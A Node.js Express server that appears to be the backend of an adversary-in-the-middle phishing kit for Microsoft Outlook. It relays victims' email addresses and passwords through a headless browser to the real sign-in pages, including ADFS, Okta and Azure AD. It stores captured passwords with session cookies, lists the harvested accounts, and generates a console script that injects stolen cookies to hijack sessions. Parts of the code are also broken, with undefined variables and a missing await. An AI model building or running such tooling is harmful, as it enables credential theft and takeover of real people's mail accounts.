const express = require('express');
const cors = require('cors');
const path = require('path');
const { OutlookLoginAutomation } = require('./src/outlook-login');

const app = express();
const PORT = process.env.PORT || 5000;

// Middleware - Configure CORS for Replit environment
app.use(cors({
    origin: true, // Allow all origins for Replit proxy
    credentials: true
}));
app.use(express.json());
app.use(express.static('public'));

// Store single automation instance - only one session allowed
let activeSession = null; // { sessionId, automation, isPreloaded, createdAt, email }
const SESSION_TIMEOUT = 30 * 60 * 1000; // 30 minutes timeout

// Helper function to initialize browser directly
async function initBrowser(session) {
    // Close any existing automation with proper timeout
    if (session.automation) {
        try {
            console.log(`Gracefully closing existing automation for session ${session.sessionId}...`);
            await Promise.race([
                session.automation.close(),
                new Promise((_, reject) => setTimeout(() => reject(new Error('Close timeout')), 5000))
            ]);
            await new Promise(resolve => setTimeout(resolve, 1000)); // Wait 1 second after close
        } catch (error) {
            console.error('Error closing existing session:', error);
        }
        session.automation = null;
    }

    try {
        session.automation = new OutlookLoginAutomation();
        await session.automation.init();
        
        console.log(`Browser initialized successfully for session ${session.sessionId}`);
        return session.automation;
    } catch (error) {
        console.error(`Failed to initialize browser for session ${session.sessionId}:`, error);
        session.automation = null;
        throw error;
    }
}

// Cleanup expired session
setInterval(() => {
    if (activeSession) {
        const now = Date.now();
        if (now - activeSession.createdAt > SESSION_TIMEOUT) {
            console.log(`🧹 Cleaning up expired session: ${activeSession.sessionId}`);
            try {
                if (activeSession.automation) {
                    activeSession.automation.close();
                }
            } catch (error) {
                console.error(`Error closing expired session ${activeSession.sessionId}:`, error);
            }
            activeSession = null;
        }
    }
}, 5 * 60 * 1000); // Check every 5 minutes

// Helper function to get or create session (only one allowed)
async function getOrCreateSession(sessionId = null) {
    // If there's an active session and it matches the requested one, return it
    if (activeSession && sessionId && activeSession.sessionId === sessionId) {
        return { sessionId: activeSession.sessionId, session: activeSession, isNew: false };
    }

    // Close any existing session before creating a new one
    if (activeSession) {
        console.log(`🔄 Closing existing session: ${activeSession.sessionId}`);
        try {
            if (activeSession.automation) {
                await Promise.race([
                    activeSession.automation.close(),
                    new Promise((_, reject) => setTimeout(() => reject(new Error('Close timeout')), 3000))
                ]);
                await new Promise(resolve => setTimeout(resolve, 500)); // Brief wait after close
            }
        } catch (error) {
            console.error(`Error closing existing session:`, error);
        }
        activeSession = null;
    }

    // Create new single session
    const newSessionId = Date.now().toString();
    activeSession = {
        sessionId: newSessionId,
        automation: null,
        isPreloaded: false,
        createdAt: Date.now(),
        email: null
    };

    console.log(`📝 Created new session: ${newSessionId} (Single session mode)`);
    return { sessionId: newSessionId, session: activeSession, isNew: true };
}

// Routes

// Health check
app.get('/api/health', (req, res) => {
    res.json({ status: 'OK', message: 'Outlook Automation Backend is running' });
});

// Preload Outlook page
app.post('/api/preload', async (req, res) => {
    try {
        const requestedSessionId = req.body.sessionId;
        const { sessionId, session, isNew } = await getOrCreateSession(requestedSessionId);

        // If already preloaded for this session, return status
        if (session.isPreloaded && session.automation) {
            return res.json({
                status: 'already-loaded',
                message: 'Outlook page is already loaded and ready',
                sessionId: sessionId
            });
        }

        // Close any existing automation for this session
        if (session.automation) {
            console.log(`Closing existing automation for session ${sessionId}...`);
            try {
                await session.automation.close();
            } catch (error) {
                console.error('Error closing existing session:', error);
            }
        }

        // Start new automation session for preloading
        console.log(`Preloading Outlook page for session ${sessionId}...`);
        
        // Initialize browser directly
        await initBrowser(session);

        // Navigate to Outlook
        const navigated = await session.automation.navigateToOutlook();
        if (!navigated) {
            await session.automation.close();
            session.automation = null;
            session.isPreloaded = false;
            return res.status(500).json({ 
                error: 'Failed to preload Outlook page' 
            });
        }

        session.isPreloaded = true;
        console.log(`Outlook page preloaded successfully for session ${sessionId}`);

        res.json({
            status: 'preloaded',
            message: 'Outlook page loaded and ready for email input',
            sessionId: sessionId
        });

    } catch (error) {
        console.error('Error preloading Outlook:', error);

        res.status(500).json({ 
            error: 'Failed to preload Outlook',
            details: error.message 
        });
    }
});

// Process email login (uses preloaded page if available)
app.post('/api/login', async (req, res) => {
    try {
        const { email, password, sessionId: requestedSessionId } = req.body;

        if (!email) {
            return res.status(400).json({ 
                error: 'Email is required' 
            });
        }

        const { sessionId, session, isNew } = await getOrCreateSession(requestedSessionId);
        session.email = email; // Store email in session

        // If not preloaded, start fresh session
        if (!session.isPreloaded || !session.automation) {
            console.log(`Starting fresh Puppeteer session for email: ${email} (Session: ${sessionId})`);

            // Close any existing automation
            if (session.automation) {
                try {
                    await session.automation.close();
                } catch (error) {
                    console.error('Error closing existing session:', error);
                }
            }

            // Initialize browser directly
            await initBrowser(session);

            // Navigate to Outlook
            const navigated = await session.automation.navigateToOutlook();
            if (!navigated) {
                await session.automation.close();
                session.automation = null;
                session.isPreloaded = false;
                return res.status(500).json({ 
                    error: 'Failed to navigate to Outlook' 
                });
            }

            session.isPreloaded = true;
        } else {
            console.log(`Using preloaded Outlook page for email: ${email} (Session: ${sessionId})`);
        }

        // Take initial screenshot
        await session.automation.takeScreenshot(`screenshots/session-${sessionId}-initial.png`);

        // Check if already logged in before trying to fill email
        const isLoggedIn = await session.automation.isLoggedIn();
        if (isLoggedIn) {
            console.log('✅ User is already logged in to Outlook!');
            return res.json({
                sessionId: sessionId,
                email: email,
                loginComplete: true,
                loginSuccess: true,
                message: 'Already logged in! Redirecting to Outlook...',
                alreadyLoggedIn: true,
                authMethod: 'existing-session'
            });
        }

        // If password is provided, perform full login
        if (password) {
            let loginSuccess = false;
            let authMethod = 'password';

            console.log('🔐 Proceeding with password login...');

            // If cookie auth failed, do full password login
            if (!loginSuccess) {
                console.log('🔐 Performing full password login...');
                loginSuccess = await session.automation.performLogin(email, password);
                authMethod = 'password';

                // If password login successful, save enhanced session with credentials
                if (loginSuccess) {
                    console.log('💾 Saving enhanced session with credentials for future use...');
                    await session.automation.saveCookies(email, password);

                    // Close current session to restart fresh
                    console.log('🔄 Closing session to restart after cookie save...');
                    await session.automation.close();
                    session.automation = null;
                    session.isPreloaded = false;
                }
            }

            // Take screenshot after login attempt
            await session.automation.takeScreenshot(`screenshots/session-${sessionId}-login.png`);

            res.json({
                sessionId: sessionId,
                email: email,
                loginComplete: true,
                loginSuccess: loginSuccess,
                authMethod: authMethod,
                message: loginSuccess ? 
                    (authMethod === 'cookies' ? 'Login successful using saved cookies!' : 'Login successful with password! Enhanced session saved.') : 
                    'Login failed or additional authentication required',
                screenshots: [
                    `screenshots/session-${sessionId}-initial.png`,
                    `screenshots/session-${sessionId}-login.png`
                ]
            });
        } else {
            // Fill email and click Next to get site response
            console.log('Filling email and clicking Next to get site response...');

            let siteReport = {
                emailFilled: false,
                nextClicked: false,
                siteResponse: '',
                errorMessages: [],
                pageUrl: '',
                pageTitle: '',
                needsPassword: false,
                needsMFA: false,
                accountExists: false
            };

            try {
                // Wait for email input and fill it
                await session.automation.page.waitForSelector('input[type="email"]', { timeout: 10000 });
                await session.automation.page.type('input[type="email"]', email);
                console.log('Email entered successfully');
                siteReport.emailFilled = true;

                // Take screenshot showing email filled
                await session.automation.takeScreenshot(`screenshots/session-${sessionId}-email-filled.png`);

                // Click Next button
                await session.automation.page.click('input[type="submit"]');
                console.log('Clicked Next button');
                siteReport.nextClicked = true;

                // Wait for page response (up to 10 seconds)
                await new Promise(resolve => setTimeout(resolve, 3000));

                // Get current page info
                siteReport.pageUrl = session.automation.page.url();
                siteReport.pageTitle = await session.automation.page.title();

                // Check for different scenarios

                // Check for password field (account exists)
                const passwordField = await session.automation.page.$('input[type="password"]');
                if (passwordField) {
                    siteReport.needsPassword = true;
                    siteReport.accountExists = true;
                    siteReport.siteResponse = 'Password field appeared - account exists and is ready for password entry';
                    console.log('Password field detected - account exists');
                }

                // Remove bordered error messages from HTML and only capture specific "account not found" error
                const errorSelectors = [
                    '[role="alert"]',
                    '.error',
                    '.ms-TextField-errorMessage',
                    '[data-testid="error"]',
                    '.alert-error',
                    '[aria-live="polite"]',
                    '.form-error'
                ];

                let foundAccountNotFoundError = false;
                for (let selector of errorSelectors) {
                    const errorElements = await session.automation.page.$$(selector);
                    for (let element of errorElements) {
                        try {
                            const errorText = await element.evaluate(el => el.textContent);
                            if (errorText && errorText.trim()) {
                                // Only capture the specific "account not found" error message
                                if (errorText.includes("We couldn't find an account with that username")) {
                                    siteReport.errorMessages.push(errorText.trim());
                                    console.log(`Found error message: ${errorText.trim()}`);
                                    foundAccountNotFoundError = true;
                                } else {
                                    // Remove all other bordered error messages from HTML
                                    await element.evaluate(el => el.remove());
                                }
                            }
                        } catch (e) {
                            // Skip if can't get text
                        }
                    }
                }

                // If account not found error, reload the page to reset the form
                if (foundAccountNotFoundError) {
                    console.log('Account not found error detected - reloading Outlook page for retry...');

                    // Navigate back to Outlook to reset the form
                    const reloaded = await session.automation.navigateToOutlook();
                    if (!reloaded) {
                        siteReport.siteResponse = 'Failed to reload page after account error';
                    } else {
                        siteReport.siteResponse = 'Page reloaded - ready for new email attempt';
                        siteReport.needsPassword = false;
                        siteReport.accountExists = false;
                        console.log('Page successfully reloaded and ready for new email');
                    }
                }

                // Check for MFA/2FA prompts
                const mfaSelectors = [
                    'input[type="tel"]',
                    '[data-testid="phone"]', 
                    '[data-testid="authenticator"]',
                    '.verification'
                ];

                for (let selector of mfaSelectors) {
                    const mfaElement = await session.automation.page.$(selector);
                    if (mfaElement) {
                        siteReport.needsMFA = true;
                        siteReport.siteResponse = 'Multi-factor authentication required';
                        console.log('MFA prompt detected');
                        break;
                    }
                }

                // If no specific response detected, get general page content
                if (!siteReport.siteResponse) {
                    try {
                        // Look for main content or messages
                        const mainContent = await session.automation.page.$eval('body', el => {
                            // Remove scripts and styles
                            const scripts = el.querySelectorAll('script, style, noscript');
                            scripts.forEach(s => s.remove());

                            // Get visible text content
                            const text = el.textContent || '';
                            return text.replace(/\s+/g, ' ').trim().substring(0, 500);
                        });

                        siteReport.siteResponse = mainContent || 'Page loaded but no specific response detected';
                    } catch (e) {
                        siteReport.siteResponse = 'Page loaded successfully';
                    }
                }

                // Take screenshot after clicking Next
                await session.automation.takeScreenshot(`screenshots/session-${sessionId}-after-next.png`);

                console.log('Site report:', JSON.stringify(siteReport, null, 2));

            } catch (error) {
                console.error('Error during email/next process:', error);
                siteReport.errorMessages.push(`Automation error: ${error.message}`);
                siteReport.siteResponse = `Error occurred: ${error.message}`;
            }

            res.json({
                sessionId: sessionId,
                email: email,
                loginComplete: false,
                siteReport: siteReport,
                message: siteReport.needsPassword ? 
                    'Email verified! Account exists and is ready for password.' : 
                    siteReport.errorMessages.length > 0 ? 
                    'Issues detected with email - see site report for details.' :
                    'Email processed - see site report for response.',
                screenshots: [
                    `screenshots/session-${sessionId}-initial.png`,
                    `screenshots/session-${sessionId}-email-filled.png`,
                    `screenshots/session-${sessionId}-after-next.png`
                ]
            });
        }

    } catch (error) {
        console.error('Error during login process:', error);

        // Clean up on error
        if (activeSession && activeSession.automation) {
            try {
                await activeSession.automation.close();
            } catch (closeError) {
                console.error('Error closing automation on error:', closeError);
            }
            activeSession.automation = null;
            activeSession.isPreloaded = false;
        }

        res.status(500).json({ 
            error: 'Login process failed',
            details: error.message 
        });
    }
});

// Continue with password (for cases where email was filled first)
app.post('/api/continue-login', async (req, res) => {
    try {
        const { password, sessionId: requestedSessionId } = req.body;

        if (!password) {
            return res.status(400).json({ 
                error: 'Password is required' 
            });
        }

        if (!activeSession || !activeSession.automation) {
            return res.status(400).json({ 
                error: 'No active session. Please start with email first.' 
            });
        }

        console.log('Continuing login with password...');

        // Continue the login process with provider detection
        try {
            // Detect the current login provider
            const loginProvider = await activeSession.automation.detectLoginProvider();
            console.log(`Detected login provider for password entry: ${loginProvider}`);

            // Handle password entry based on the provider
            let passwordSuccess = false;

            if (loginProvider === 'microsoft') {
                passwordSuccess = await activeSession.automation.handleMicrosoftLogin(password);
            } else if (loginProvider === 'adfs') {
                passwordSuccess = await activeSession.automation.handleADFSLogin(password);
            } else if (loginProvider === 'okta') {
                passwordSuccess = await activeSession.automation.handleOktaLogin(password);
            } else if (loginProvider === 'azure-ad') {
                passwordSuccess = await activeSession.automation.handleAzureADLogin(password);
            } else if (loginProvider === 'generic-saml') {
                passwordSuccess = await activeSession.automation.handleGenericSAMLLogin(password);
            } else {
                console.warn(`Unknown login provider in continue-login. Attempting generic login...`);
                passwordSuccess = await activeSession.automation.handleGenericLogin(password);
            }

            if (!passwordSuccess) {
                console.warn('Password login attempt failed, but continuing with flow...');
            }

            // Handle "Stay signed in?" prompt
            await session.automation.handleStaySignedInPrompt();

            // Wait a bit more after handling the prompt
            await new Promise(resolve => setTimeout(resolve, 3000));

            // Take screenshot after login
            await session.automation.takeScreenshot(`screenshots/session-${sessionId}-final.png`);

            // Check if we're successfully logged in
            const currentUrl = session.automation.page.url();
            const loginSuccess = currentUrl.includes('outlook.office.com/mail');

            let responseMessage = '';
            if (loginSuccess) {
                // Save enhanced session with email and password for future automatic login
                console.log('💾 Saving enhanced session with full credentials...');
                const email = session.email || 'unknown'; // Use stored email from session
                const sessionFile = await session.automation.saveCookies(email, password);
                responseMessage = sessionFile ? 
                    `Login completed successfully! Enhanced session saved to: ${sessionFile}` :
                    'Login completed successfully!';

                // Close current session to restart fresh
                console.log('🔄 Closing session to restart after cookie save...');
                await session.automation.close();
                session.automation = null;
                session.isPreloaded = false;
            } else {
                responseMessage = 'Login may require additional verification';
            }

            res.json({
                sessionId: sessionId,
                loginComplete: true,
                loginSuccess: loginSuccess,
                message: responseMessage,
                screenshot: `screenshots/session-${sessionId}-final.png`
            });

        } catch (error) {
            console.error('Error during password entry:', error);
            res.status(500).json({ 
                error: 'Failed to complete login',
                details: error.message 
            });
        }

    } catch (error) {
        console.error('Error in continue-login:', error);
        res.status(500).json({ 
            error: 'Continue login failed',
            details: error.message 
        });
    }
});

// Take screenshot of current state
app.post('/api/screenshot', async (req, res) => {
    try {
        const { sessionId: requestedSessionId } = req.body;
        const { sessionId, session } = await getOrCreateSession(requestedSessionId);

        if (!session.automation) {
            return res.status(400).json({ 
                error: 'No active automation session' 
            });
        }

        const filename = `screenshots/session-${sessionId}-${Date.now()}.png`;
        await session.automation.takeScreenshot(filename);

        res.json({
            sessionId: sessionId,
            screenshot: filename,
            message: 'Screenshot taken successfully'
        });

    } catch (error) {
        console.error('Error taking screenshot:', error);
        res.status(500).json({ 
            error: 'Failed to take screenshot',
            details: error.message 
        });
    }
});

// Check emails (if logged in)
app.get('/api/emails', async (req, res) => {
    try {
        const { sessionId: requestedSessionId } = req.query;
        const { sessionId, session } = await getOrCreateSession(requestedSessionId);

        if (!session.automation) {
            return res.status(400).json({ 
                error: 'No active automation session' 
            });
        }

        const emails = await session.automation.checkEmails();

        res.json({
            sessionId: sessionId,
            emails,
            count: emails.length
        });

    } catch (error) {
        console.error('Error checking emails:', error);
        res.status(500).json({ 
            error: 'Failed to check emails',
            details: error.message 
        });
    }
});

// Close current session
app.delete('/api/session', async (req, res) => {
    try {
        const { sessionId: requestedSessionId } = req.body;

        if (!activeSession) {
            return res.status(400).json({ 
                error: 'No active session to close' 
            });
        }

        if (activeSession.automation) {
            await activeSession.automation.close();
        }

        activeSession = null;

        res.json({
            sessionId: requestedSessionId,
            message: 'Session closed successfully'
        });

    } catch (error) {
        console.error('Error closing session:', error);
        res.status(500).json({ 
            error: 'Failed to close session',
            details: error.message 
        });
    }
});

// Handle back navigation - reload Outlook page
app.post('/api/back', async (req, res) => {
    try {
        const { sessionId: requestedSessionId } = req.body;
        const { sessionId, session } = await getOrCreateSession(requestedSessionId);

        if (!session.automation) {
            return res.status(400).json({ 
                error: 'No active session' 
            });
        }

        console.log('Back button clicked - auto reloading Outlook page...');

        // Navigate back to Outlook to reset the form
        const reloaded = await session.automation.navigateToOutlook();
        if (!reloaded) {
            return res.status(500).json({ 
                error: 'Failed to reload Outlook page' 
            });
        }

        console.log('Page successfully reloaded after back navigation');

        res.json({
            sessionId: sessionId,
            message: 'Outlook page reloaded successfully',
            status: 'reloaded'
        });

    } catch (error) {
        console.error('Error during back navigation reload:', error);
        res.status(500).json({ 
            error: 'Failed to reload page on back navigation',
            details: error.message 
        });
    }
});

// Get current session status
app.get('/api/status', (req, res) => {
    res.json({
        hasActiveSession: activeSession !== null,
        sessionCount: activeSession ? 1 : 0,
        sessionId: activeSession ? activeSession.sessionId : null
    });
});

// Load saved session for automatic login - DISABLED
app.post('/api/load-session', async (req, res) => {
    res.status(400).json({ 
        error: 'Session loading functionality has been removed'
    });
});

// List available sessions
app.get('/api/sessions', (req, res) => {
    try {
        const fs = require('fs');
        const path = require('path');
        const sessionDir = 'session_data';

        if (!fs.existsSync(sessionDir)) {
            return res.json({ 
                sessions: [],
                count: 0,
                message: 'No session directory found'
            });
        }

        try {
            const sessions = [];
            const items = fs.readdirSync(sessionDir);
            
            // Look for session files (new single-file format) and directories (old format)
            for (const item of items) {
                const itemPath = path.join(sessionDir, item);
                
                if (fs.lstatSync(itemPath).isFile() && item.startsWith('session_') && item.endsWith('.json')) {
                    // New single-file format
                    try {
                        const sessionData = JSON.parse(fs.readFileSync(itemPath, 'utf8'));
                        const stats = fs.statSync(itemPath);
                        
                        sessions.push({
                            email: sessionData.email || 'Unknown',
                            timestamp: sessionData.timestamp,
                            cookieCount: sessionData.cookies ? sessionData.cookies.length : 0,
                            totalCookies: sessionData.totalCookies,
                            hasPassword: !!sessionData.password,
                            id: sessionData.id,
                            sessionPath: itemPath,
                            format: 'single-file',
                            lastModified: stats.mtime
                        });
                    } catch (e) {
                        console.log(`⚠️ Failed to parse session file ${item}: ${e.message}`);
                    }
                } else if (fs.lstatSync(itemPath).isDirectory() && item.startsWith('session_')) {
                    // Old individual files format
                    const metadataFile = path.join(itemPath, 'session_metadata.json');
                    
                    if (fs.existsSync(metadataFile)) {
                        try {
                            const metadata = JSON.parse(fs.readFileSync(metadataFile, 'utf8'));
                            const stats = fs.statSync(itemPath);
                            
                            // Count individual cookie files
                            const cookieFiles = fs.readdirSync(itemPath).filter(file => 
                                file.startsWith('cookie_') && file.endsWith('.json')
                            );
                            
                            sessions.push({
                                email: metadata.email || 'Unknown',
                                timestamp: metadata.timestamp,
                                cookieCount: cookieFiles.length,
                                totalCookies: metadata.totalCookies,
                                hasPassword: !!metadata.password,
                                id: metadata.id,
                                sessionPath: itemPath,
                                format: 'directory',
                                lastModified: stats.mtime
                            });
                        } catch (e) {
                            console.log(`⚠️ Failed to parse metadata for ${item}: ${e.message}`);
                        }
                    }
                }
            }
            
            // Also check for legacy consolidated file
            const consolidatedFile = path.join(sessionDir, 'all_sessions.json');
            if (fs.existsSync(consolidatedFile)) {
                try {
                    const content = JSON.parse(fs.readFileSync(consolidatedFile, 'utf8'));
                    const stats = fs.statSync(consolidatedFile);

                    if (content.accounts && Array.isArray(content.accounts)) {
                        content.accounts.forEach(account => {
                            sessions.push({
                                email: account.email || 'Unknown',
                                timestamp: account.timestamp,
                                cookieCount: account.cookies ? account.cookies.length : 0,
                                hasPassword: !!account.password,
                                id: account.id,
                                sessionPath: consolidatedFile,
                                isLegacy: true,
                                lastModified: stats.mtime
                            });
                        });
                    }
                } catch (e) {
                    console.log(`⚠️ Failed to parse legacy consolidated file: ${e.message}`);
                }
            }

            // Sort by timestamp (newest first)
            sessions.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));

            res.json({ 
                sessions: sessions,
                count: sessions.length,
                individualSessions: sessions.filter(s => !s.isLegacy).length,
                legacySessions: sessions.filter(s => s.isLegacy).length,
                message: sessions.length === 0 ? 'No sessions found' : `Found ${sessions.length} session(s)`
            });

        } catch (parseError) {
            console.error('Error parsing sessions:', parseError);
            res.status(500).json({ 
                error: 'Failed to parse sessions',
                details: parseError.message 
            });
        }

    } catch (error) {
        console.error('Error listing sessions:', error);
        res.status(500).json({ 
            error: 'Failed to list sessions',
            details: error.message 
        });
    }
});

// Export cookies for browser injection
app.get('/api/export-cookies', async (req, res) => {
    try {
        const { sessionId: requestedSessionId } = req.query;
        const { sessionId, session } = getOrCreateSession(requestedSessionId);

        if (!session.automation) {
            return res.status(400).json({ 
                error: 'No active session found' 
            });
        }

        // Get enhanced cookies from all Microsoft domains
        console.log('📦 Collecting enhanced cookies for export...');

        // Temporarily save cookies to get the enhanced collection
        const tempCookieFile = await session.automation.saveCookies();

        // Load the enhanced cookies from the saved file
        const fs = require('fs');
        const path = require('path');
        const jsonFile = tempCookieFile.replace('.txt', '.json');

        let enhancedCookies = [];
        if (fs.existsSync(jsonFile)) {
            const cookiesData = fs.readFileSync(jsonFile, 'utf8');
            enhancedCookies = JSON.parse(cookiesData);
        }

        console.log(`📊 Found ${enhancedCookies.length} enhanced cookies for export`);

        // Generate enhanced JavaScript cookie injection script
        const cookieInjectionScript = `
// Enhanced Microsoft Outlook Cookie Injection Script
(function() {
    console.log('🍪 Injecting ${enhancedCookies.length} Microsoft authentication cookies...');
    console.log('📍 This includes cookies from all Microsoft auth domains');

    const cookies = ${JSON.stringify(enhancedCookies)};
    let successCount = 0;
    let domains = new Set();

    // First, try to navigate to Microsoft login to set domain context
    if (window.location.hostname !== 'login.microsoftonline.com') {
        console.log('💡 For best results, run this on login.microsoftonline.com first');
    }

    cookies.forEach(cookie => {
        try {
            let cookieString = cookie.name + '=' + cookie.value + ';';

            // Use the original expiry if available, otherwise set to 1 year
            if (cookie.expires && cookie.expires !== -1) {
                const expiryDate = new Date(cookie.expires * 1000);
                cookieString += 'expires=' + expiryDate.toUTCString() + ';';
            } else {
                cookieString += 'Max-Age=31536000;'; // 1 year for session cookies
            }

            if (cookie.path) cookieString += 'path=' + cookie.path + ';';
            if (cookie.domain) cookieString += 'domain=' + cookie.domain + ';';
            if (cookie.secure) cookieString += 'secure;';
            if (cookie.httpOnly) cookieString += 'httponly;';
            if (cookie.sameSite) cookieString += 'samesite=' + cookie.sameSite + ';';

            document.cookie = cookieString;
            successCount++;
            domains.add(cookie.domain);
            console.log('✅ Set cookie:', cookie.name, 'for', cookie.domain);
        } catch (error) {
            console.warn('⚠️ Failed to set cookie:', cookie.name, error);
        }
    });

    console.log(\`🎉 Successfully injected \${successCount} cookies across \${domains.size} domains!\`);
    console.log('🌐 Domains covered:', Array.from(domains).join(', '));
    console.log('🔄 Navigate to https://outlook.office.com/mail/ to test authentication');

    // Auto-redirect option
    const redirect = confirm(\`Successfully injected \${successCount} authentication cookies!\\n\\nWould you like to open Outlook now?\`);
    if (redirect) {
        window.open('https://outlook.office.com/mail/', '_blank');
    }

    return {
        success: true,
        cookiesSet: successCount,
        totalCookies: cookies.length,
        domains: Array.from(domains)
    };
})();
`;

        res.json({
            success: true,
            cookieCount: enhancedCookies.length,
            injectionScript: cookieInjectionScript,
            redirectUrl: 'https://outlook.office.com/mail/',
            message: 'Copy the script to your browser console or click the button to inject cookies'
        });

    } catch (error) {
        console.error('Error exporting cookies:', error);
        res.status(500).json({ 
            error: 'Failed to export cookies',
            details: error.message 
        });
    }
});

// Serve frontend
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Error handling middleware
app.use((err, req, res, next) => {
    console.error('Unhandled error:', err);
    res.status(500).json({ 
        error: 'Internal server error',
        details: err.message 
    });
});

// Graceful shutdown
process.on('SIGINT', async () => {
    console.log('\n🔄 Shutting down server...');

    // Close active automation session
    if (activeSession) {
        try {
            console.log(`Closing session ${activeSession.sessionId}...`);
            if (activeSession.automation) {
                await activeSession.automation.close();
            }
        } catch (error) {
            console.error(`Error closing session ${activeSession.sessionId}:`, error);
        }
    }

    activeSession = null;
    console.log('✅ All sessions closed. Server shutdown complete.');
    process.exit(0);
});

// Start server
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Outlook Automation Backend running on port ${PORT}`);
    console.log(`📧 API endpoints available at http://localhost:${PORT}/api/`);
    console.log(`🌐 Frontend available at http://localhost:${PORT}/`);
});